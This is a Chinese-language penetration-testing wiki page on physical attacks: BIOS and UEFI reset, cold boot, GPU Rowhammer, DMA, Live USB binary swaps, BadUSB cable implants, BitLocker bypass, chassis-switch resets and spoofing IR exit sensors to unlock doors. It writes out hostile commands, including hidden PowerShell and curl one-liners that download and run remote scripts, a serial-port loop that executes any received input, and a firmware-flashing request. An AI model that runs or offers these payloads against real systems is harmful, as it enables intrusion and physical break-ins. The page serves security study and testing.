# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**重置 BIOS** 可以通过多种方式实现。大多数主板都配备有一块**电池**，将其取出约 **30 分钟** 后，BIOS 设置（包括密码）将被重置。或者，也可以调整**主板上的跳线**，通过连接特定针脚来重置这些设置。

如果无法或不便进行硬件调整，**software tools** 可以提供解决方案。使用类似 **Kali Linux** 的 distribution 从 **Live CD/USB** 启动后，即可使用 **_killCmos_** 和 **_CmosPWD_** 等工具协助恢复 BIOS 密码。

如果不知道 BIOS 密码，连续 **三次** 输入错误密码通常会生成错误代码。可以将此代码输入 [https://bios-pw.org](https://bios-pw.org) 等网站，以尝试获取可用密码。

### UEFI Security

对于使用 **UEFI** 而非传统 BIOS 的现代系统，可以使用 **chipsec** 来分析和修改 UEFI 设置，包括禁用 **Secure Boot**。可以使用以下命令完成此操作：
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM 在断电后会短暂保留数据，通常为 **1 到 2 分钟**。通过施加液氮等低温物质，可以将这种持久性延长至 **10 分钟**。在此延长期间，可以使用 **dd.exe** 和 **volatility** 等工具创建 **memory dump** 以供分析。

---

## GPU Rowhammer Against Page Tables

当现代 GPU Rowhammer 攻击的目标从普通缓冲区转向 **GPU virtual-memory metadata** 时，其实用性会大幅提升。近期针对 **GDDR6 NVIDIA Ampere GPUs** 的研究表明，攻击者可以运行非特权 CUDA code，构建 GPU 专用的 hammering patterns，使用 **memory massaging** 将 paging structures 放置到易受攻击的行中，然后翻转 **last-level page table** 或中间 **page directory** 中的 bit。一旦某个 translation entry 被破坏，攻击者就可以建立 **arbitrary GPU memory read/write**，随后进一步 pivot 至 host compromise。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. 在 GDDR6 中 **Profile hammerable rows**，并构建能够感知 refresh、且非均匀的 hammering patterns，以绕过 in-DRAM mitigations。
2. **Massage GPU allocations**，使 driver 将 page-translation structures 放置在可 hammer 的物理位置，而不是默认的受保护 pool 中。实际操作中，这可能意味着耗尽 low-memory page-table region，并以受控 stride 对大型稀疏 UVM mappings 进行 spraying。
3. **Flip translation metadata**，例如 page-table / page-directory entry 内的 **PFN** 或与 aperture 相关的 bits，使攻击者控制的 virtual page 解析到 page-table pages、arbitrary GPU memory 或 host-visible system mappings。
4. 重用伪造的 mapping，改写其他 translation entries，并在 GPU contexts 之间升级为 **arbitrary GPU memory read/write**。

### Host Pivot and Mitigations

- 当 **IOMMU disabled** 时，伪造的 system-aperture mappings 可以向 GPU 暴露任意 **host physical memory**，使 GPU primitive 转化为完整的 host compromise。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** 以 last-level page-table entries 为目标，而 **GeForge** 表明，破坏 page-directory level 可能更容易，因为一次 bit flip 就能重定向更大的 translation subtree。不要只将某一层 paging layer 视为 security-critical。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** 仍然很重要，因为它能够阻止 GDDRHammer/GeForge 所使用的直接 arbitrary-host-memory 路径，但它**不是完整的 mitigation**。**GPUBreach** 展示了第二阶段的 pivot：攻击者破坏 GPU 可写、由 driver 所有的 CPU buffers，然后触发 NVIDIA driver 的 memory-safety bugs，以获得 kernel write primitive，并在启用 IOMMU 的情况下取得 **root shell**。<sup>[[3]](#references)</sup>
- 在受支持的 workstation/server GPUs 上，**system-level ECC** 是一种实际可行的 hardening 措施。没有 ECC 的 consumer GPUs 暴露出更弱的防御面。<sup>[[4]](#references)</sup>
- 这些攻击并非纯理论：**GeForge** 在 RTX 3060 上报告了 **1,171** 次 bit flips，在 RTX A6000 上报告了 **202** 次，这已经足以构建可工作的 host-privilege-escalation chain。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** 是一个通过 DMA 执行 **physical memory manipulation** 的工具，兼容 **FireWire** 和 **Thunderbolt** 等 interfaces。它可以通过 patching memory 使系统接受任意 password，从而绕过 login procedures。不过，它对 **Windows 10** systems 无效。

---

## Live CD/USB for System Access

将 **_sethc.exe_** 或 **_Utilman.exe_** 等 system binaries 替换为 **_cmd.exe_** 的副本，可以提供一个具有 system privileges 的 command prompt。可以使用 **chntpw** 等工具编辑 Windows installation 的 **SAM** file，从而更改 password。

**Kon-Boot** 是一个 tool，可以通过临时修改 Windows kernel 或 UEFI，使用户无需知道 password 即可登录 Windows systems。更多信息请参阅 [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/)。<sup>[[10]](#references)</sup>

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**：访问 BIOS settings。
- **F8**：进入 Recovery mode。
- 在 Windows banner 出现后按下 **Shift**，可以绕过 autologon。

### BAD USB Devices

**Rubber Ducky** 和 **Teensyduino** 等 devices 可作为创建 **bad USB** devices 的 platform，在连接到 target computer 时执行预定义的 payloads。

### Volume Shadow Copy

Administrator privileges 允许通过 PowerShell 创建敏感 files 的 copies，包括 **SAM** file。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- 基于 ESP32-S3 的 implants，例如 **Evil Crow Cable Wind**，隐藏在 USB-A→USB-C 或 USB-C↔USB-C cables 内部，仅作为 USB keyboard 进行枚举，并通过 Wi-Fi 暴露其 C2 stack。Operator 只需从 victim host 为 cable 供电，创建名称为 `Evil Crow Cable Wind`、password 为 `123456789` 的 hotspot，然后访问 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP address），即可进入内置的 HTTP interface。<sup>[[8]](#references)</sup>
- Browser UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* tabs。Stored payloads 会按 OS 添加 tag，keyboard layouts 可以动态切换，并且 VID/PID strings 可以被修改，以仿冒已知 peripherals。
- 由于 C2 位于 cable 内部，phone 可以 staging payloads、trigger execution 并管理 Wi-Fi credentials，而无需接触 host OS——非常适合短 dwell-time 的 physical intrusions。

### OS-aware AutoExec payloads

- AutoExec rules 将一个或多个 payloads 绑定为在 USB enumeration 后立即执行。Implant 会执行轻量级的 OS fingerprinting，并选择匹配的 script。
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
- *macOS/Linux:* `COMMAND SPACE`（Spotlight）或 `CTRL ALT T`（terminal）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 由于 execution 无需人工操作，仅替换 charging cable 就可以在已登录 user context 下实现“plug-and-pwn” initial access。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap：**Stored payload 会打开 console，并粘贴一个 loop，在新的 USB serial device 上执行收到的任何内容。一个最小化的 Windows variant 是：
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge：** implant 保持 USB CDC channel 开启，同时其 ESP32-S3 启动一个 TCP client（Python script、Android APK 或 desktop executable）连接回 operator。TCP session 中输入的任何字节都会被转发到上述 serial loop，从而即使在 air-gapped hosts 上也能实现 remote command execution。输出受限，因此 operator 通常会运行 blind commands（创建 account、准备 additional tooling 等）。

### HTTP OTA update surface

- 同一 web stack 通常还会暴露未认证的 firmware updates。Evil Crow Cable Wind 监听 `/update`，并刷写上传的任意 binary：
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- 现场操作员可以在交战过程中热插拔功能（例如刷入 USB Army Knife 固件），无需打开线缆，从而让 implant 在仍连接目标主机时切换到新的能力。

## 绕过 BitLocker 加密

如果在内存转储文件（**MEMORY.DMP**）中找到 **recovery password**，则可能绕过 BitLocker 加密。可以使用 **Elcomsoft Forensic Disk Decryptor** 或 **Passware Kit Forensic** 等工具来实现。

---

## 通过 Social Engineering 添加 Recovery Key

可以通过 social engineering 手段添加新的 BitLocker recovery key：诱使用户执行一条命令，添加一个由零组成的新 recovery key，从而简化解密过程。

---

## 利用 Chassis Intrusion / Maintenance Switch 将 BIOS 恢复出厂设置

许多现代笔记本电脑和小型台式机都包含一个由 Embedded Controller（EC）以及 BIOS/UEFI 固件监控的 **chassis-intrusion switch**。该开关的主要用途是在设备外壳被打开时发出警报，但一些厂商有时会实现一种**未公开的 recovery shortcut**，在按照特定模式切换开关时触发。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻击原理

1. 该开关连接到 EC 上的 **GPIO interrupt**。
2. EC 上运行的固件会记录**按压的时间间隔和次数**。
3. 识别出硬编码模式后，EC 会调用 *mainboard-reset* 例程，**擦除系统 NVRAM/CMOS 的内容**。
4. 下次启动时，BIOS 会加载默认值——**supervisor password、Secure Boot keys 以及所有自定义配置都会被清除**。

> 一旦 Secure Boot 被禁用且 firmware password 消失，攻击者便可以直接启动任意外部 OS 镜像，并获得对内部驱动器的不受限制访问权限。

### 真实案例 – Framework 13 Laptop

Framework 13（第 11/12/13 代）的 recovery shortcut 是：
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
第十次循环后，EC 会设置一个标志，指示 BIOS 在下次重启时擦除 NVRAM。整个过程耗时约 40 秒，并且**只需要一把螺丝刀**。<sup>[[5]](#references)</sup>

### 通用 Exploitation 流程

1. 启动目标设备，或执行挂起-恢复操作，使 EC 运行。
2. 拆下底盖，露出入侵/维护开关。
3. 重现厂商特定的切换模式（查阅文档、论坛，或对 EC 固件进行 reverse-engineer）。
4. 重新组装并重启——固件保护应已被禁用。
5. 启动 live USB（例如 Kali Linux），并执行常规 post-exploitation（凭据转储、数据外传、植入恶意 EFI binaries 等）。

### 检测与缓解

* 在 OS management console 中记录机箱入侵事件，并与异常 BIOS 重置进行关联。
* 在螺丝/外壳上使用**防拆封条**，以检测设备是否被打开。
* 将设备存放在**物理受控区域**；假设获得物理访问权限即意味着完全 compromise。
* 如果支持，禁用厂商的“maintenance switch reset”功能，或要求额外的 cryptographic authorisation 才能重置 NVRAM。

---

## 针对 No-Touch Exit Sensors 的隐蔽 IR 注入

### 传感器特征
- 商品化的“挥手出门”传感器将近红外 LED emitter 与电视遥控器式 receiver module 配对使用；只有在检测到多个（约 4–10 个）正确载波（约 30 kHz）脉冲后，才会报告 logic high。<sup>[[7]](#references)</sup>
- 塑料罩会阻止 emitter 与 receiver 直接相互照射，因此 controller 会假设任何经过验证的载波都来自附近的反射，并驱动 relay 打开门锁。
- 一旦 controller 认为目标已出现，它通常会改变 outbound modulation envelope，但 receiver 仍会接受任何符合经过滤载波的 burst。

### 攻击流程
1. **捕获发射特征**——将 logic analyser 并接到 controller pins 上，记录驱动内部 IR LED 的检测前和检测后波形。
2. **仅重放“检测后”波形**——移除/忽略原厂 emitter，并从一开始就使用已触发的 pattern 驱动外部 IR LED。由于 receiver 只关注脉冲数量/频率，它会将 spoofed carrier 视为真实反射，并使 relay line 进入有效状态。
3. **控制传输时序**——以经过调节的 burst 发送载波（例如开启数十毫秒，关闭时间相近），在不使 receiver 的 AGC 或 interference handling logic 饱和的情况下，传输最低所需的脉冲数量。持续发射会很快使传感器灵敏度下降，并停止触发 relay。

### 远距离反射注入
- 使用高功率 IR diode、MOSFET driver 和聚焦 optics 替换实验用 LED 后，可以可靠地从约 6 米外触发传感器。
- 攻击者不需要与 receiver aperture 保持 line-of-sight；将光束对准玻璃可见的室内墙壁、货架或门框，可使反射能量进入约 30° 的 field of view，从而模拟近距离挥手。
- 由于 receiver 只预期接收较弱的反射信号，强得多的外部光束可以在多个表面间反弹，同时仍保持在 detection threshold 之上。

### Weaponised Attack Torch
- 将 driver 嵌入商用手电筒可让工具在公开场合下不易被察觉。将可见 LED 更换为与 receiver 频段匹配的高功率 IR LED，添加 ATtiny412（或类似 MCU）生成约 30 kHz 的 burst，并使用 MOSFET sink LED 电流。
- Telescopic zoom lens 可收窄光束以提高距离/精度；MCU 控制的 vibration motor 则可在不发出可见光的情况下，通过触觉确认 modulation 已启用。
- 在多个已存储的 modulation patterns 之间循环（使用略有差异的载波频率和 envelope）可提高不同 rebranded sensor families 之间的兼容性，使 operator 能够扫描反射表面，直到 relay 发出咔嗒声并释放门锁。

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
